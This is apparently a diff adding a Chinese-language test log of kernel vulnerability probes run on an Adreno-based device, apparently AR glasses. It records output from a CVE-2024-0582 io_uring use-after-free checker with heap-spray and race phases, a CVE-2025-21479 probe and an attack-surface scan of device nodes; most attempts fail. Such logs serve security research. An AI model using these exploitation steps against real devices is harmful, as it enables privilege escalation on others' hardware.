@@ -1,0 +1,125 @@
+# KGSL ioctl 本世代回測（1.22.009 / kernel 5.10.209-perf-gd908d71a0404）
+# 日期：2026-09-13 11:15:22  裝置：<DEVICE_SERIAL>
+# 方法：執行既有探針二進位（同裝置 aarch64；原始碼見 source_code/），每支 timeout 30s
+
+## 裝置基本資訊
+1.22.009-20260710-150201
+5.10.209-perf-gd908d71a0404-ab1.22.009-20260710-150201
+Adreno621v1Enforcing
+
+## test_gpumem
+opened fd=3
+[00] GPUMEM_ALLOC size=0x1000 flags=0x00000000 align=0 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[01] GPUMEM_ALLOC size=0x1000 flags=0x000c0000 align=12 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[02] GPUMEM_ALLOC size=0x1000 flags=0x00140000 align=20 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[03] GPUMEM_ALLOC size=0x1000 flags=0x00190000 align=25 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[04] GPUMEM_ALLOC size=0x1000 flags=0x00200000 align=32 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[05] GPUMEM_ALLOC size=0x1000 flags=0x003f0000 align=63 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[06] GPUMEM_ALLOC size=0x1000 flags=0x00800000 align=128 -> r=-1 errno=95(Operation not supported on transport endpoint)
+[07] GPUMEM_ALLOC size=0x1000 flags=0x00ff0000 align=255 -> r=-1 errno=95(Operation not supported on transport endpoint)
+crashed=0
+
+## test_sync_errno
+opened fd=3
+CREATE: r=-1 errno=25(Inappropriate ioctl for device) id=0
+
+## cve_2025_21479_probe_v5
+[-] Parent mmap failed: Invalid argument
+[Child] Allocated at 0x4000000000
+[Child] Exiting to trigger memory free...
+
+## cve_2024_0582_uaf_check
+============================================================
+  CVE-2024-0582 UAF Verifier
+  Target: Rokid AR Glasses (Linux 5.10.209)
+============================================================
+
+[Phase 1] Initializing io_uring...
+[+] io_uring_setup success: fd=3
+    sq_entries=32, cq_entries=64
+    features=0x7ff
+[+] Ring mapped successfully
+    SQ ring: 0x76e0a1f000, SQEs: 0x76e0a1e000, CQ ring: 0x76e0a1d000
+
+[Phase 2] Allocating user buffers...
+[+] User buffer: 0x74cf984000, size: 32768
+
+[Phase 3] Submitting PROVIDE_BUFFERS (BGID=1)...
+[+] PROVIDE_BUFFERS result: res=-22, user_data=0x1001
+    Error: Invalid argument
+
+[Phase 4] Submitting REMOVE_BUFFERS (UAF trigger point)...
+[+] REMOVE_BUFFERS result: res=-22, user_data=0x1002
+    Error: Invalid argument
+
+[Phase 5] Heap spray to reclaim freed memory...
+[+] Heap spray: 32 socket pairs, 64 bytes each (0x42 fill)
+[+] Heap spray: 64 socket pairs, 128 bytes each (0x43 fill)
+[+] Heap spray: 96 socket pairs, 256 bytes each (0x44 fill)
+
+[Phase 6] Attempting to trigger UAF by accessing stale buffer group...
+[+] Re-PROVIDE_BUFFERS result: res=-22
+
+[Phase 7] Rapid provide/remove cycles (race condition attempt)...
+    Cycle 0: provide/remove BGID=100, remove_res=-22
+    Cycle 1: provide/remove BGID=101, remove_res=-22
+    Cycle 2: provide/remove BGID=102, remove_res=-22
+    Cycle 3: provide/remove BGID=103, remove_res=-22
+    Cycle 4: provide/remove BGID=104, remove_res=-22
+
+[Phase 8] Cleanup...
+
+
+## attack_surface_probe
+=== Attack Surface Probe ===
+uid=2000 euid=2000
+
+[Device nodes] open 測試
+  /dev/kgsl-3d0                  O_RDONLY=OK   O_RDWR=OK 
+  /dev/i2c-0                     O_RDONLY=DENY  O_RDWR=DENY
+      O_RDONLY errno=13 (Permission denied)
+      O_RDWR   errno=13 (Permission denied)
+  /dev/i2c-1                     O_RDONLY=OK   O_RDWR=OK 
+  /dev/i2c-2                     O_RDONLY=DENY  O_RDWR=DENY
+      O_RDONLY errno=13 (Permission denied)
+      O_RDWR   errno=13 (Permission denied)
+  /dev/binder                    O_RDONLY=OK   O_RDWR=OK 
+  /dev/hwbinder                  O_RDONLY=OK   O_RDWR=OK 
+  /dev/vndbinder                 O_RDONLY=OK   O_RDWR=OK 
+  /dev/adsprpc-smd               O_RDONLY=OK   O_RDWR=DENY
+      O_RDWR   errno=13 (Permission denied)
+  /dev/adsprpc-smd-secure        O_RDONLY=OK   O_RDWR=DENY
+      O_RDWR   errno=13 (Permission denied)
+  /dev/ttyS0                     O_RDONLY=DENY  O_RDWR=DENY
+      O_RDONLY errno=13 (Permission denied)
+      O_RDWR   errno=13 (Permission denied)
+  /dev/ttyHS0                    O_RDONLY=OK   O_RDWR=OK 
+  /dev/spidev0.0                 O_RDONLY=DENY  O_RDWR=DENY
+      O_RDONLY errno=2 (No such file or directory)
+      O_RDWR   errno=2 (No such file or directory)
+  /dev/diag                      O_RDONLY=DENY  O_RDWR=DENY
+      O_RDONLY errno=2 (No such file or directory)
+      O_RDWR   errno=2 (No such file or directory)
+
+[I2C /dev/i2c-1] ioctl 權限測試
+  open O_RDWR OK (fd=3)
+  ioctl(I2C_SLAVE, 0x3f mp2724): ret=-1 errno=16 (Device or resource busy)
+  ioctl(I2C_SLAVE, 0x64 cw221x): ret=-1 errno=16 (Device or resource busy)
+
+[Binder] open + BINDER_VERSION ioctl
+  open O_RDWR OK (fd=3); BINDER_VERSION ret=0 proto=8 errno=0 (Success)
+
+[BPF] load trivial SOCKET_FILTER + SO_ATTACH_BPF
+  BPF_PROG_LOAD OK (prog_fd=3)
+
+## ashmem_ioctl_test
+ASHMEM_SET_NAME = 0x41007701
+ASHMEM_GET_NAME = 0x81007702
+ASHMEM_GET_SIZE = 0x80087703
+open /dev/ashmem OK fd=3
+SET_NAME -> r=0 errno=0 (Success)
+GET_NAME -> r=0 errno=0 (Success)
+GET_NAME[0..24]: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 00 00 00
+GET_NAME string: AAAAAAAAAA
+GET_SIZE -> r=-1 errno=25 (Inappropriate ioctl for device) size=0
+
